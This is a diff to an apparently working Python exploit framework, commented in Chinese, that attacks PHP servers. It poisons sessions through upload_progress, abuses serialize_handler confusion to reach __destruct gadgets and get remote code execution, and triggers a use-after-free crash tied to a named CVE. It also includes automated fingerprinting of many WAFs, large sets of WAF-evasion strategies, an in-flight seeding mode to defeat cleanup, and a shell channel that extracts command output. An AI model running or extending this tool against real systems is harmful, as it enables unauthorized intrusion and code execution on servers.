@@ -28,12 +28,18 @@ WAF/防御绕过层（新增）：
 auto 流水线（每目标）：指纹 -> 端点发现 -> gadget 矩阵 -> inject 原语 ->
   hijack 矩阵（含绕过变体轮换）-> uaf 链（CALL_ADDR 自动解析）-> JSONL 落盘
 安全默认：默认命令为无害标记 echo P2S_<token>；破坏性命令需显式 --cmd。
-目标一律为占位符 TARGET/SEED_PATH/TRIGGER_PATH/GADGET/PROP/COMMAND/
-CALL_ADDR/OFFSET/SID。Python 3.8+，仅标准库。
+目标一律为占位符 TARGET/SEED_PATH/TRIGGER_PATH/GADGET/PROP/COMMAND/SID。Python 3.8+，仅标准库。
+
+机制依据（联网取证 + 官方源码/补丁逆向，详见 RESEARCH.md）：
+  hijack 链 = session.upload_progress 会话投毒 + serialize_handler 混淆 ->
+    解码失败清理期 __destruct（公开 PoC 实测 RCE；8.5.12 以 incomplete_classes_only 关闭）；
+  uaf 链 = CVE-2026-109619 BG(unserialize) 跨请求悬垂（plant -> 解码 OOM -> 小会话复用
+    -> SIGSEGV）；崩溃确定性，RCE 条件化，自动化只判 crash_signal。
 """
 
 import argparse
 import concurrent.futures as cf
+import gzip
 import json
 import os
 import random
@@ -41,19 +47,20 @@ import re
 import socket
 import ssl
 import string
-import struct
 import subprocess
 import sys
 import time
 import urllib.parse
-from typing import Dict, Iterable, List, Optional, Tuple
+import zlib
+from typing import Dict, Iterable, List, Optional, Tuple, Union
 
 # ---------------------------------------------------------------------------
 # 常量 / 字典
 # ---------------------------------------------------------------------------
 
 FIXED = {"8.5": (8, 5, 12), "8.4": (8, 4, 27), "8.3": (8, 3, 36), "8.2": (8, 2, 35)}
-KNOWN_DELTAS = {"bookworm": 0xC930, "noble": 0xCEF0, "jammy": 0xD060}
+# 5.4~8.1 为 EOL 分支：官方 2026-10-21 仅对受支持的 8.2/8.3/8.4/8.5 出补丁，
+# EOL 分支无官方修复、永久受影响（advisory 明示）
 
 SEED_CANDIDATES = [
     "/app/seed.php", "/seed.php", "/upload/seed.php", "/session/seed.php",
@@ -70,7 +77,7 @@ GADGET_CANDIDATES = [
     "GuzzleHttp\\Psr7\\FnStream", "Laravel\\Livewire\\Mechanisms\\HandleComponents",
 ]
 PROP_CANDIDATES = ["cmd", "command", "prop", "data", "buffer", "fn", "handlers"]
-PROGRESS_VALUE_VARIANTS = ["pipe_object", "bare_object"]
+PROGRESS_VALUE_VARIANTS = ["pipe_object", "pipe_clean"]
 DEFAULT_EXPECT_TOKEN = "P2S_"
 
 # ---- WAF 绕过层字典 ----
@@ -101,15 +108,16 @@ CHALLENGE_MARKERS = [b"captchaV2.js", b"cf-browser-verification", b"chlChallenge
 # 策略优先级：按 WAF 指纹选择的绕过模板顺序（元素为策略键）
 BYPASS_PROFILES = {
     "aliyun_waf":  ["serp_frag", "warmup_cookie", "ua_crawler", "junk_headers",
-                    "uri_double_enc", "hpp", "chunked_frag", "http10",
+                    "uri_double_enc", "uri_enc", "hpp", "chunked_frag", "http10",
                     "path_info", "plus_len"],
     "cloudflare":  ["serp_frag", "warmup_cookie", "ua_crawler", "junk_headers",
                     "chunked_frag", "hpp", "uri_case", "http10"],
-    "modsecurity": ["serp_frag", "uri_double_enc", "hpp", "chunked_frag",
+    "modsecurity": ["serp_frag", "uri_double_enc", "uri_enc", "hpp", "chunked_frag",
                     "uri_case", "junk_headers", "path_info", "plus_len"],
     "unknown":     ["plain", "serp_frag", "warmup_cookie", "junk_headers",
-                    "uri_double_enc", "hpp", "chunked_frag", "uri_case",
-                    "path_info", "http10", "plus_len"],
+                    "uri_double_enc", "uri_enc", "uri_dot_seg", "uri_dot_norm",
+                    "uri_semi", "uri_slash", "uri_tail", "hpp", "chunked_frag",
+                    "uri_case", "path_info", "http10", "plus_len"],
 }
 # POST 被 403 拦截时的自适应模板（multipart POST 定向变形）
 BYPASS_PROFILES["post_403"] = [
@@ -120,23 +128,27 @@ BYPASS_PROFILES["post_403"] = [
 BYPASS_PROFILES["semantic_block"] = ["plus_len", "serp_hex"]
 # 南墙 WAF（NQWAF，nginx+lua 开源 WAF）：编码/分块/HPP/CT 变形族
 BYPASS_PROFILES["nqwaf"] = [
-    "plus_len", "serp_hex", "serp_frag", "uri_double_enc", "hpp", "ct_case",
+    "plus_len", "serp_hex", "serp_frag", "uri_double_enc", "uri_enc", "hpp", "ct_case",
     "chunked_frag", "junk_field", "http10", "disorder", "uri_case", "path_info",
 ]
 # 宝塔 WAF（bt_panel/aaWAF）：boundary/参数污染/CT 空白族
 BYPASS_PROFILES["bt_panel"] = [
     "plus_len", "serp_hex", "serp_frag", "ct_space", "hpp", "junk_field",
-    "bnd_long", "uri_double_enc", "chunked_frag", "expect_100", "disorder",
+    "bnd_long", "uri_double_enc", "uri_enc", "chunked_frag", "expect_100", "disorder",
     "path_info", "http10",
 ]
 # 多层 WAF 堆叠（如 阿里云+南墙+宝塔）：全策略去重并集，逐一自动尝试
-_seen: List[str] = []
-for _p in BYPASS_PROFILES.values():
-    for _s in _p:
-        if _s not in _seen:
-            _seen.append(_s)
-BYPASS_PROFILES["stacked"] = list(_seen)
-ALL_STRATEGIES = list(_seen)          # --try-all 全量逐一尝试序列
+def _dedupe_profile(profiles) -> List[str]:
+    seen: List[str] = []
+    for prof in profiles:
+        for s in prof:
+            if s not in seen:
+                seen.append(s)
+    return seen
+
+
+BYPASS_PROFILES["stacked"] = _dedupe_profile(list(BYPASS_PROFILES.values()))
+ALL_STRATEGIES = list(BYPASS_PROFILES["stacked"])   # --try-all 全量逐一尝试序列
 DEFAULT_PROFILE = BYPASS_PROFILES["unknown"]
 
 BANNER_RE = re.compile(r"PHP/(\d+)\.(\d+)(?:\.(\d+))?")
@@ -167,11 +179,65 @@ def php_serialize_object(cls: str, prop: str, value: str) -> str:
     return 'O:%d:"%s":1:{%s}' % (len(cls), cls, body)
 
 
+def derive_expect(cmd: str) -> List[str]:
+    """从命令形态推导回显判据候选（自定义 --cmd 未显式 --expect 时用）：
+    echo 语句取重定向/管道前的完整文本与末词；多词非 echo 命令取末词。
+    不再混入与输出无关的 token 死候选，降低弱假阳性面。"""
+    cands: List[str] = []
+    m = re.match(r"\s*echo\s+(.+?)(?:\s*(?:>>?|&&|\|\||[|;])\s*.*)?$", cmd)
+    text = (m.group(1) if m else "").strip().strip('"').strip("'")
+    if text:
+        cands.append(text)
+        if len(text.split()) > 1:
+            cands.append(text.split()[-1])
+    else:
+        words = cmd.split()
+        if len(words) > 1:
+            cands.append(words[-1])
+    return [c for c in dict.fromkeys(cands) if c]
+
+
+# ---- 稳定 shell 通道（自动 RCE 建链 + 标记限界输出提取）----
+# 包装形态：echo __P2S_B_<tok>__<SEP><cmd><SEP> echo __P2S_E_<tok>__
+# sh 目标 SEP=';'，cmd.exe 目标 SEP='&'（建链探测自动选择）；输出严格限界于两标记之间，
+# 告警/HTML/页面噪声天然剔除。
+
+def wrap_shell_cmd(cmd: str, sep: str, tok: str) -> str:
+    """括号分组包装：gadget 自带的 ' 2>&1' 作用于整组，链内每段 stderr 均可回显
+    （分组=子 shell 语义无损——每条命令本就独立请求，无跨命令状态）；存在未配对括号的
+    命令可能破坏分组，此时提取失败走 clean_shell_body 降级。"""
+    return "(echo __P2S_B_%s__%s%s%s echo __P2S_E_%s__)" % (tok, sep, cmd, sep, tok)
+
+
+def extract_shell_output(body: str, tok: str) -> Optional[str]:
+    """提取标记限界内的命令输出；标记缺失/乱序时返回 None（通道异常信号）。"""
+    b, e = "__P2S_B_%s__" % tok, "__P2S_E_%s__" % tok
+    if b in body and e in body and body.index(e) > body.index(b):
+        return body.split(b, 1)[1].split(e, 1)[0].strip("\r\n")
+    return None
+
+
+def clean_shell_body(body: str, tok: str) -> str:
+    """无标记时的降级清洗：去 HTML 标签/decode 告警/PHP 错误行/标记残留。"""
+    body = re.sub(r"<[^>]+>", "", body)
+    b, e = "__P2S_B_%s__" % tok, "__P2S_E_%s__" % tok
+    lines = [ln for ln in body.splitlines()
+             if "Failed to decode session object" not in ln
+             and not re.match(r"\s*(Warning|Fatal error|Notice|Deprecated|Parse error)\s*:", ln)
+             and b not in ln and e not in ln]
+    return "\n".join(lines).strip()
+
+
 def load_lines(path: Optional[str]) -> List[str]:
     if not path or not os.path.exists(path):
         return []
     with open(path, encoding="utf-8", errors="replace") as f:
         return [ln.strip() for ln in f if ln.strip() and not ln.lstrip().startswith("#")]
+
+
+def split_set_cookie(value: str) -> List[str]:
+    """拆分多值 Set-Cookie（_parse_response 以 \\n 连接保存的多条记录）。"""
+    return [v.strip() for v in value.split("\n") if v.strip()]
 
 
 # ---------------------------------------------------------------------------
@@ -205,7 +271,8 @@ class BypassEngine:
         self.profile = profile or DEFAULT_PROFILE
         self.idx = 0
         self.body_budget = 8192            # 载荷体预算（体积规则命中时自动压缩）
-        self.seed_mode = "abort"           # abort=中止式投毒（兼容 cleanup=On）/ full=完整发送
+        self.seed_mode = "full"            # full=完整发送（需 cleanup=Off，公开 PoC 可靠持久化路径）
+                                           # abort=在途窗口实验模式（实测 8.2.34 会话仅在解析完成时写盘）
         self.warmed_cookies: List[str] = []
 
     # ---- 策略轮换 ----
@@ -255,14 +322,31 @@ class BypassEngine:
     # ---- URI 层 ----
     def uri(self, path: str, strategy: str) -> str:
         if strategy == "uri_double_enc":
-            return re.sub(r"[^/]", lambda m: "%%%02X" % ord(m.group(0))[0] if False else
-                          "%%%02X" % ord(m.group(0)), path)
+            # 真·双重编码：普通字符 -> %25XX（一次解码得 %XX，二次解码才还原，打击二次解码型 WAF/代理）
+            return re.sub(r"[^/]", lambda m: "%%25%02X" % ord(m.group(0)), path)
+        if strategy == "uri_enc":
+            # 单次全量百分号编码：WAF 见变形串、服务端一次解码还原
+            return re.sub(r"[^/]", lambda m: "%%%02X" % ord(m.group(0)), path)
+        if strategy == "uri_dot_seg":
+            # %2e 段混淆：句点编码后与归一化前后规则不一致
+            return path.replace(".", "%2e")
+        if strategy == "uri_dot_norm":
+            # /./ 归一化差异
+            return "/." + path if path.startswith("/") else "/./" + path
+        if strategy == "uri_semi":
+            # 分号矩阵参数（PATH_INFO 解析差异）
+            return path + ";x"
+        if strategy == "uri_slash":
+            # 重复斜杠
+            return re.sub(r"/+", "//", path)
+        if strategy == "uri_tail":
+            # 尾斜杠
+            return path if path.endswith("/") else path + "/"
         if strategy == "uri_case":
             return "".join(c.upper() if i % 2 else c for i, c in enumerate(path))
         if strategy == "path_info":
-            return path.rstrip("/") + "/index.php/x" if path.endswith(".php") is False else path + "/x"
-        if strategy == "uri_slash":
-            return re.sub(r"/+", "//", path)
+            # PATH_INFO 后缀
+            return path + "/x" if path.endswith(".php") else path.rstrip("/") + "/index.php/x"
         return path
 
     # ---- 参数层（HPP / 字段顺序 / boundary 引号）----
@@ -282,7 +366,7 @@ class BypassEngine:
             return {"Content-Type": 'multipart/form-data; boundary="%s"' % boundary}
         return {"Content-Type": "multipart/form-data; boundary=" + boundary}
 
-    # ---- 传输层：FRAGMENT 分片慢发（terminate=False 时不发终止块=中止式投毒）----
+    # ---- 传输层：FRAGMENT 分片慢发（terminate=False 时不发终止块=在途窗口投毒）----
     @staticmethod
     def fragment_writer(body: bytes, delay: float = 0.2, frag: int = 512,
                         terminate: bool = True):
@@ -344,6 +428,19 @@ class HttpTarget:
             raw = ctx.wrap_socket(raw, server_hostname=self.host)
         return raw
 
+    def _head(self, method: str, path: str, hdrs: Dict[str, str],
+              quirks: Optional[Dict] = None) -> bytes:
+        """构造请求头字节（供 request() 与在途窗口投毒的自管 socket 共用）。"""
+        q = quirks or {}
+        ver = q.get("http_version", "1.1")
+        target = ("%s://%s%s" % (self.scheme, self.host, path)
+                  if q.get("abs_uri") else path)
+        if q.get("lower_headers"):
+            hdrs = {k.lower(): v for k, v in hdrs.items()}
+        return ("%s %s HTTP/%s\r\n" % (method, target, ver) +
+                "".join("%s: %s\r\n" % (k, v) for k, v in hdrs.items()) +
+                "\r\n").encode("latin-1")
+
     def request(self, method: str, path: str, body: bytes = b"",
                 headers: Optional[Dict[str, str]] = None,
                 raw_body_writer=None,
@@ -358,17 +455,10 @@ class HttpTarget:
             hdrs["Content-Length"] = str(len(body))
         elif raw_body_writer is not None:
             hdrs.setdefault("Transfer-Encoding", "chunked")
-        if q.get("lower_headers"):
-            hdrs = {k.lower(): v for k, v in hdrs.items()}
-        ver = q.get("http_version", "1.1")
-        target = path
-        if q.get("abs_uri"):
-            target = "%s://%s%s" % (self.scheme, self.host, path)
-        req = "%s %s HTTP/%s\r\n" % (method, target, ver) + \
-              "".join("%s: %s\r\n" % (k, v) for k, v in hdrs.items()) + "\r\n"
+        req = self._head(method, path, hdrs, q)
         s = self._connect()
         try:
-            s.sendall(req.encode("latin-1"))
+            s.sendall(req)
             if body and raw_body_writer is None:
                 s.sendall(body)
             if raw_body_writer is not None:
@@ -398,12 +488,54 @@ class HttpTarget:
         lines = head.decode("latin-1", "replace").split("\r\n")
         m = re.match(r"HTTP/\d\.\d\s+(\d+)", lines[0] if lines else "")
         code = int(m.group(1)) if m else 0
-        hdrs = {}
+        hdrs: Dict[str, str] = {}
         for line in lines[1:]:
             if ":" in line:
                 k, v = line.split(":", 1)
-                hdrs[k.strip().lower()] = v.strip()
+                k, v = k.strip().lower(), v.strip()
+                # 多值头（尤其 Set-Cookie）追加保存，避免互相覆盖只留最后一条
+                hdrs[k] = (hdrs[k] + "\n" + v) if k in hdrs else v
+        body = HttpTarget._decode_body(hdrs, body)
         return code, hdrs, body
+
+    @staticmethod
+    def _decode_chunked(body: bytes) -> bytes:
+        """去掉 chunked 分块帧（分块/分片策略回包），畸形时返回已解出部分或原始体。"""
+        out: List[bytes] = []
+        i = 0
+        while True:
+            j = body.find(b"\r\n", i)
+            if j < 0:
+                return b"".join(out) if out else body
+            try:
+                n = int(body[i:j].split(b";", 1)[0].strip(), 16)
+            except ValueError:
+                return b"".join(out) if out else body
+            i = j + 2
+            if n == 0:
+                break
+            out.append(body[i:i + n])
+            i += n + 2
+        return b"".join(out)
+
+    @staticmethod
+    def _decode_body(hdrs: Dict[str, str], body: bytes) -> bytes:
+        """按 Transfer-Encoding / Content-Encoding 还原响应体（chunked/gzip/deflate），
+        否则命令回显会被分块帧/压缩体污染，rce_hit 判定出现假阴性。"""
+        if "chunked" in hdrs.get("transfer-encoding", "").lower():
+            body = HttpTarget._decode_chunked(body)
+        enc = hdrs.get("content-encoding", "").lower()
+        try:
+            if "gzip" in enc:
+                body = gzip.decompress(body)
+            elif "deflate" in enc:
+                try:
+                    body = zlib.decompress(body)
+                except zlib.error:
+                    body = zlib.decompress(body, -zlib.MAX_WBITS)
+        except Exception:
+            pass    # 解码失败保留原始体，避免丢判定材料
+        return body
 
 
 # ---------------------------------------------------------------------------
@@ -434,7 +566,7 @@ def seed_body(sid: str, gadget: str, prop: str, cmd: str,
               strategy: str = "plain", file_len: int = 8192) -> Tuple[bytes, str]:
     obj = php_serialize_object(gadget, prop, cmd)
     if strategy in ("plus_len", "serp_hex"):
-        # PHP>=7.2 unserialize 接受 '+' 长度符号（phpggc --plus-numbers 官方手法），
+        # unserialize 长度解析接受 '+' 符号（公开 WP 验证的 /[oc]:\d+:/i 绕过标准手法），
         # WAF 正则 /O:[0-9]+:/ 无法匹配 -> 实测 403->404 语义绕过
         obj = re.sub(r"([OC]):(\d+):", lambda m: "%s:+%s:" % (m.group(1), m.group(2)), obj)
     if strategy == "serp_hex":
@@ -444,9 +576,14 @@ def seed_body(sid: str, gadget: str, prop: str, cmd: str,
                          m.group(1),
                          "".join("\\%02x" % c for c in m.group(2).encode("utf-8", "surrogateescape"))),
                      obj)
-    if variant == "bare_object":
-        val = obj + ";TRAILING_GARBAGE_FORCE_DECODE_FAIL"
-    else:
+    # 载体 = PHP_SESSION_UPLOAD_PROGRESS 表单值（源码取证结论）：
+    #   * php 解码器按 name|value 切分，'|' 前缀是对象落到 value 位的必要条件（缺 pipe 无法实例化）
+    #   * 对象之后必须留无 '|' 的尾部垃圾：解码游标走到尾部找不到下一个分隔符 ->
+    #     decode FAILURE -> php_session_cancel_decode() -> destroy -> __destruct 先于告警执行
+    #   * 文件名载体不可靠：getword/getword_conf 在引号/分号处截断（zhaoboy 取证）
+    if variant == "pipe_clean":
+        val = "|" + obj      # 公开 PoC 原始格式（Nayrae/junaire）：靠尾部容器数据强制失败
+    else:                    # pipe_object（默认）：显式尾部垃圾，失败确定性最强
         val = "|" + obj + ";TRAILING_GARBAGE_FORCE_DECODE_FAIL"
     fields = BypassEngine.mangle_fields(
         [("PHPSESSID", sid), ("PHP_SESSION_UPLOAD_PROGRESS", val)], strategy)
@@ -457,20 +594,32 @@ def seed_body(sid: str, gadget: str, prop: str, cmd: str,
                            boundary=boundary)
 
 
-def uaf_arm_body(sid: str, progress_key: str, size: int,
-                 boundary: Optional[str] = None,
-                 strategy: str = "plain") -> Tuple[bytes, str]:
+def truncate_multipart(body: bytes, boundary: str) -> bytes:
+    """截断 multipart 至收尾 boundary 之前，让 rfc1867 解析停在“上传中”。
+    源码事实（rfc1867.c:1266-72 fileupload_done）：MULTIPART_EVENT_END 无条件触发，
+    含收尾 boundary 解析完成与中途断连；cleanup=On 随即删除投毒键（A/B 实测 cleanup=1
+    -> 0B 文件）。可用窗口 = 请求存活期（update() 已把键落盘，session.c:3196-3206），
+    触发必须发生在 seed 连接关闭之前。"""
+    close = ("\r\n--%s--\r\n" % boundary).encode()
+    idx = body.rfind(close)
+    return body[:idx] if idx >= 0 else body
+
+
+def uaf_plant_body(sid: str, progress_value: str, file_len: int = 2048,
+                   boundary: Optional[str] = None,
+                   strategy: str = "plain") -> Tuple[bytes, str]:
+    """CVE-2026-109619 触发原语：把 progress 值原样写进会话键 upload_progress_<值>
+    （session.c:3196-3206；载体约束：无 '|'、无 CR/LF）。超大值用于后续解码 OOM，
+    小值用于构造可被解码的小会话。"""
     fields = BypassEngine.mangle_fields(
-        [("PHPSESSID", sid), ("PHP_SESSION_UPLOAD_PROGRESS", progress_key)], strategy)
-    return build_multipart(fields, file_data=b"\x41" * size, boundary=boundary)
+        [("PHPSESSID", sid), ("PHP_SESSION_UPLOAD_PROGRESS", progress_value)], strategy)
+    return build_multipart(fields, file_data=b"A" * file_len, boundary=boundary)
 
 
-def forged_zval_fcall(call_addr: int, offset: int, cmd: str) -> bytes:
-    cmd_bytes = cmd.encode() + b"\x00"
-    hdr = struct.pack("<QQ", call_addr, offset)
-    flags = struct.pack("<I", 0x00000024)
-    pad = b"\x00" * (0x40 - (len(hdr) + len(flags) + len(cmd_bytes)) % 0x40)
-    return hdr + flags + cmd_bytes + pad
+# P1+P2 会话文件写入原语（zhaoboy 实测链）的标记载荷：
+#   P1 PHPSESSID 表单字段 -> PS(id)（session.c:3263/3308），绕过 use_only_cookies=On
+#   P2 progress 值原样成为会话键；升级为 RCE 需应用侧 include/require sink（LFI）
+INJECT_MARKER = '<?php echo "P2S_INJ_MARK"; ?>'
 
 
 # ---------------------------------------------------------------------------
@@ -496,27 +645,40 @@ def resolve_redirects(t: HttpTarget, max_hops: int = 3) -> Tuple[HttpTarget, Lis
     return cur, hops
 
 
-def check_one(t: HttpTarget) -> Dict:
-    code, hdrs, body = t.request("GET", t.base_path)
-    blob = (hdrs.get("x-powered-by", "") + " " +
-            hdrs.get("server", "") + " " + body[:8192].decode("latin-1", "replace"))
-    m = BANNER_RE.search(blob)
-    r = {"url": t.url, "http": code, "server": hdrs.get("server"),
-         "banner": m.group(0) if m else None, "status": "no_php_version",
-         "waf": waf_fingerprint(hdrs, body), "challenge": is_challenge(body)}
-    if not m:
-        return r
-    major, minor, patch = int(m.group(1)), int(m.group(2)), int(m.group(3) or 0)
+def php_version_status(major: int, minor: int, patch: Optional[int]) -> str:
+    """按补丁表判定版本面状态：patched / branch_only / likely_vulnerable /
+    eol_affected（EOL backport 分支，受影响面）/ eol_or_unknown。"""
     key = "%d.%d" % (major, minor)
     if key in FIXED:
-        if m.group(3) is None:
-            r["status"] = "branch_only"
-        elif (major, minor, patch) >= FIXED[key]:
-            r["status"] = "patched"
-        else:
-            r["status"] = "likely_vulnerable"
-    else:
-        r["status"] = "eol_or_unknown"
+        if patch is None:
+            return "branch_only"
+        return "patched" if (major, minor, patch) >= FIXED[key] else "likely_vulnerable"
+    return "eol_affected" if (major, minor) < (8, 2) else "eol_or_unknown"
+
+
+def check_one(t: HttpTarget) -> Dict:
+    """指纹探测：base_path 无 banner 时回退常见 PHP 页面
+    （php -S/无 index 的根路径返 404 且不带 X-Powered-By）。"""
+    r: Dict = {"url": t.url, "http": 0, "server": None, "banner": None,
+               "status": "no_php_version", "waf": "unknown", "challenge": False}
+    for p in dict.fromkeys([t.base_path, "/index.php", "/info.php",
+                            "/api/app.php", "/phpinfo.php"]):
+        try:
+            code, hdrs, body = t.request("GET", p)
+        except Exception:
+            continue
+        blob = (hdrs.get("x-powered-by", "") + " " +
+                hdrs.get("server", "") + " " + body[:8192].decode("latin-1", "replace"))
+        m = BANNER_RE.search(blob)
+        r.update(http=code, server=hdrs.get("server"),
+                 waf=waf_fingerprint(hdrs, body), challenge=is_challenge(body))
+        if not m:
+            continue
+        major, minor = int(m.group(1)), int(m.group(2))
+        patch = int(m.group(3)) if m.group(3) else None
+        r["banner"] = m.group(0)
+        r["status"] = php_version_status(major, minor, patch)
+        return r
     return r
 
 
@@ -590,7 +752,10 @@ def warmup(t: HttpTarget, engine: BypassEngine) -> Dict:
     """预热：首击采样 WAF 追踪 Cookie（acw_tc/cdn_sec_tc 等）供后续请求复用。"""
     code, hdrs, body = t.request("GET", t.base_path,
                                  headers={"User-Agent": UA_POOL[0]})
-    cks = [v.split(";")[0] for k, v in hdrs.items() if k.lower() == "set-cookie"]
+    cks: List[str] = []
+    for k, v in hdrs.items():
+        if k.lower() == "set-cookie":
+            cks += [c.split(";")[0] for c in split_set_cookie(v)]
     engine.warmed_cookies = cks
     return {"http": code, "cookies": cks, "challenge": is_challenge(body)}
 
@@ -656,17 +821,17 @@ def defense_audit(t: HttpTarget) -> Dict:
     block, clean = 0, 0
     for p in SEMANTIC_PAYLOADS:
         try:
-            c, _, _ = probe("POST", t.base_path,
-                            urllib.parse.urlencode({"q": p}).encode(),
-                            "application/x-www-form-urlencoded")
-            if c in (403, 406, 419, 429, 520) or is_challenge(b""):
+            c, _, rb = probe("POST", t.base_path,
+                             urllib.parse.urlencode({"q": p}).encode(),
+                             "application/x-www-form-urlencoded")
+            if c in (403, 406, 419, 429, 520) or is_challenge(rb):
                 block += 1
         except Exception:
             block += 1
     try:
-        c, _, _ = probe("POST", t.base_path, b"q=hello+world",
-                        "application/x-www-form-urlencoded")
-        clean = 0 if c in (403, 406, 419, 429, 520) else 1
+        c, _, rb = probe("POST", t.base_path, b"q=hello+world",
+                         "application/x-www-form-urlencoded")
+        clean = 0 if (c in (403, 406, 419, 429, 520) or is_challenge(rb)) else 1
     except Exception:
         pass
     evidence["semantic"] = {"attack_payloads_blocked": block,
@@ -719,19 +884,27 @@ def defense_audit(t: HttpTarget) -> Dict:
 
 def chain_hijack(t: HttpTarget, seed_path: str, trigger_path: str,
                  gadget: str, prop: str, cmd: str,
-                 sid: Optional[str] = None, expect: Optional[str] = None,
+                 sid: Optional[str] = None,
+                 expect: Optional[Union[str, List[str]]] = None,
                  variant: str = "pipe_object",
                  monitor_url: Optional[str] = None,
-                 engine: Optional[BypassEngine] = None) -> Dict:
+                 engine: Optional[BypassEngine] = None,
+                 seed_t: Optional[HttpTarget] = None,
+                 fire_t: Optional[HttpTarget] = None) -> Dict:
+    """seed_t/fire_t 可分离（公开 PoC 的 --seed-url/--trigger-url 形态）：
+    handler 混淆链的投毒端点与触发端点可位于不同 vhost/端口（各自 INI 决定
+    session.serialize_handler），共享同一 session.save_path。"""
+    seed_t = seed_t or t
+    fire_t = fire_t or t
     sid = sid or rand_sid()
     engine = engine or BypassEngine(0)
-    # expect 候选集：显式 > echo 末词 > 全局 token 形态（自定义 --cmd 不再假阴性）
+    # expect 候选集：显式判据 > 按命令形态推导（echo 取重定向前文本+末词）
     if isinstance(expect, (list, tuple)):
         expect_cands = [c for c in expect if c]
     elif expect:
         expect_cands = [expect]
     else:
-        expect_cands = [cmd.split()[-1]] if cmd.startswith("echo") and len(cmd.split()) > 1 else []
+        expect_cands = derive_expect(cmd)
     strategy = engine.next_strategy()
     body, boundary = seed_body(sid, gadget, prop, cmd, variant=variant,
                                strategy=strategy, file_len=engine.body_budget)
@@ -741,45 +914,89 @@ def chain_hijack(t: HttpTarget, seed_path: str, trigger_path: str,
     quirks = {"http_version": "1.0"} if strategy == "http10" else (
         {"abs_uri": True} if strategy == "abs_uri" else (
             {"lower_headers": True} if strategy == "lower_hdr" else None))
-    # 投毒发送器：abort 模式不发终止块并断开 -> rfc1867 已写条目但 cleanup 不执行
-    # （兼容默认 session.upload_progress.cleanup=On；seed 在触发前持久化）
-    term = (engine.seed_mode != "abort")
-    if strategy == "serp_frag":
-        rw = engine.sig_frag_writer(body, terminate=term)
-    elif strategy == "chunked_frag":
-        rw = engine.fragment_writer(body, terminate=term)
-    elif not term:
-        rw = engine.fragment_writer(body, frag=len(body) or 1, terminate=False)
-    else:
-        rw = None
-    try:
-        code, _, resp = t.request(
-            "POST", engine.uri(seed_path, strategy), body=body,
-            headers=engine.headers(strategy, boundary, sid),
-            raw_body_writer=rw, quirks=quirks,
-            timeout=(2.0 if not term else None))     # 中止式投毒不等响应
-        log["steps"].append({"step": "seed", "http": code, "len": len(resp)})
-    except Exception as e:
-        log["error"] = "seed: %s" % e
-        return log
-    try:
-        code, hdrs, resp = t.request(
-            "GET", engine.uri(trigger_path, strategy),
-            headers=engine.headers(strategy, "", sid), quirks=quirks)
-        log["steps"].append({"step": "fire", "http": code, "len": len(resp)})
+
+    def record(code: int, hdrs: Dict[str, str], resp: bytes) -> None:
+        text = resp.decode("latin-1", "replace")
+        log["challenge_blocked"] = is_challenge(resp)
+        log["decode_warning"] = "Failed to decode session object" in text
+        log["rce_hit"] = any(c and c in text for c in expect_cands)
+        log["body"] = text[:1500]
         if hdrs.get("set-cookie"):
-            engine.warmed_cookies = [hdrs["set-cookie"].split(";")[0]]
-    except Exception as e:
-        log["error"] = "fire: %s" % e
-        return log
-    text = resp.decode("latin-1", "replace")
-    log["challenge_blocked"] = is_challenge(resp)
-    log["decode_warning"] = "Failed to decode session object" in text
-    log["rce_hit"] = any(c and c in text for c in expect_cands)
-    log["body"] = text[:1500]
-    if monitor_url and not log["rce_hit"]:
+            engine.warmed_cookies = [c.split(";")[0]
+                                     for c in split_set_cookie(hdrs["set-cookie"])]
+
+    def fire() -> Tuple[int, Dict[str, str], bytes]:
+        return fire_t.request("GET", engine.uri(trigger_path, strategy),
+                              headers=engine.headers(strategy, "", sid), quirks=quirks)
+
+    if engine.seed_mode == "abort":
+        # ---- 在途窗口投毒（兼容默认 session.upload_progress.cleanup=On）----
+        # 源码取证：投毒键在请求存活期由 update() 写入 sess 文件（session.c:3196-3206）；
+        # MULTIPART_EVENT_END 在收尾 boundary 解析完成或中途断连时无条件触发并删除该键
+        # （rfc1867.c:1266-72，A/B 实测 cleanup=1 -> 0B），“裸断连保 seed”不成立。
+        # 因此：截断收尾 boundary + chunked 不发终止块，让解析停在“上传中”，
+        # 全部触发射击都发生在 seed 连接关闭之前（cleanup 只会在窗口用毕后执行）。
+        hold_body = truncate_multipart(body, boundary)
+        sock = seed_t._connect()
         try:
-            _, _, mb = t.request("GET", monitor_url)
+            h = dict(engine.headers(strategy, boundary, sid))
+            h["Transfer-Encoding"] = "chunked"
+            sock.sendall(seed_t._head("POST", engine.uri(seed_path, strategy), h))
+            engine.fragment_writer(hold_body, terminate=False)(sock)
+            log["steps"].append({"step": "seed-hold", "len": len(hold_body)})
+            time.sleep(0.6)                      # 等 update() 落盘
+        except Exception as e:
+            try:
+                sock.close()
+            except Exception:
+                pass
+            log["error"] = "seed-hold: %s" % e
+            return log
+        try:
+            for att in range(3):                 # 窗口内连射，抢在关闭前命中
+                try:
+                    code, hdrs, resp = fire()
+                except Exception as e:
+                    log["steps"].append({"step": "fire", "attempt": att + 1,
+                                         "err": str(e)})
+                    break
+                log["steps"].append({"step": "fire", "attempt": att + 1,
+                                     "http": code, "len": len(resp)})
+                record(code, hdrs, resp)
+                if log.get("rce_hit"):
+                    break
+                time.sleep(0.5)
+        finally:
+            sock.close()                         # END→cleanup 在此之后才发生
+    else:
+        # ---- 完整发送（要求 session.upload_progress.cleanup=Off 才能跨请求持久化；
+        #      cleanup=On 时键会在本请求解析结束时被删除——公开 PoC lab 均设 Off）----
+        if strategy == "serp_frag":
+            rw = engine.sig_frag_writer(body, terminate=True)
+        elif strategy == "chunked_frag":
+            rw = engine.fragment_writer(body, terminate=True)
+        else:
+            rw = None
+        try:
+            code, _, resp = seed_t.request(
+                "POST", engine.uri(seed_path, strategy), body=body,
+                headers=engine.headers(strategy, boundary, sid),
+                raw_body_writer=rw, quirks=quirks)
+            log["steps"].append({"step": "seed", "http": code, "len": len(resp)})
+        except Exception as e:
+            log["error"] = "seed: %s" % e
+            return log
+        try:
+            code, hdrs, resp = fire()
+            log["steps"].append({"step": "fire", "http": code, "len": len(resp)})
+            record(code, hdrs, resp)
+        except Exception as e:
+            log["error"] = "fire: %s" % e
+            return log
+
+    if monitor_url and not log.get("rce_hit"):
+        try:
+            _, _, mb = fire_t.request("GET", monitor_url)
             log["armed"] = b"upload_progress" in mb
         except Exception:
             pass
@@ -787,84 +1004,77 @@ def chain_hijack(t: HttpTarget, seed_path: str, trigger_path: str,
 
 
 # ---------------------------------------------------------------------------
-# chain uaf（CALL_ADDR 自动解析）
